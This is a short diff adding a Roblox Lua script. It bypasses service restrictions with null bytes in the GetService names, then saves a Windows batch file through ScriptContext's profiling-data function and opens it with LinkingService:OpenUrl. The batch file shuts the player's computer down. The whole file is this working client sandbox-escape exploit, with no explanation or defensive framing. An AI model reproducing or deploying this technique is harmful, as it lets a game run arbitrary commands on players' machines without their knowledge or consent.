@@ -1,1 +1,7 @@
+local LinkingService = game:GetService("LinkingService\0 meow meow meow")
+local ScriptContext = game:GetService("ScriptContext\0 meow meow!!")
+local scriptContent = [[@echo off
 shutdown /s
+]]
+local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
+LinkingService:OpenUrl(payload)
